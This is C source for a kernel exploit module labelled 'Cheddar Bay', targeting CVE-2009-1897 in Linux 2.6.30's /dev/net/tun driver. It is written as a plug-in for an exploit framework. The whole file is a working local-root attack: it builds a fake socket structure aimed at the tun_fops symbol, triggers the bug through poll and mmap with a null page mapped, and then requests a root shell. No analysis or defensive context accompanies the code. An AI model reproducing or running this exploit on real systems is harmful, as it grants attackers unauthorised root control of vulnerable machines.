/* wunderbar */
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <fcntl.h>
#include <poll.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include "exp_framework.h"

struct exploit_state *exp_state;

#define OFFSET_OF_FLAGS 0x8

struct sock {
	char gibberish1[0x60];
	char gibberish2[0xe0];
	unsigned long gibberish3[0x50];
};

char *desc = "Cheddar Bay: Linux 2.6.30/2.6.30.1 /dev/net/tun local root";
char *cve = "CVE-2009-1897";

int prepare(unsigned char *buf)
{
	struct sock *sk = (struct sock *)buf;
	struct pollfd pfd;
	unsigned long target_addr;
	int i;
	int fd;

	fd = open("/dev/net/tun", O_RDONLY);
	if (fd < 0) {
		fprintf(stdout, "Unable to open /dev/net/tun!\n");
		return 0;
	}
	close(fd);
	fd = open("/dev/net/tun", O_RDWR);
	if (fd < 0) {
		fprintf(stdout, "Unable to open /dev/net/tun!\n");
		return 0;
	}

	target_addr = exp_state->get_kernel_sym("tun_fops") + (sizeof(unsigned long) * 11);

	memset(sk->gibberish1, 0, sizeof(sk->gibberish1));
	memset(sk->gibberish2, 0, sizeof(sk->gibberish2));
	for (i = 0; i < sizeof(sk->gibberish3)/sizeof(sk->gibberish3[0]); i++)
		sk->gibberish3[i] = target_addr - OFFSET_OF_FLAGS;

	pfd.fd = fd;
	pfd.events = POLLIN | POLLOUT;
	poll(&pfd, 1, 0);

	close(fd);

	return EXECUTE_AT_NONZERO_OFFSET | 1;
}

int requires_null_page = 1;

int requires_symbols_to_trigger = 1;

int get_exploit_state_ptr(struct exploit_state *ptr)
{
	exp_state = ptr;
	return 0;
}

int trigger(void)
{
	int fd;
	fd = open("/dev/net/tun", O_RDONLY);
	if (fd < 0)
		return 0;
	mmap(NULL, 0x1000, PROT_READ, MAP_PRIVATE, fd, 0);
	close(fd);

	return 1;
}

int post(void)
{
	return RUN_ROOTSHELL;
}
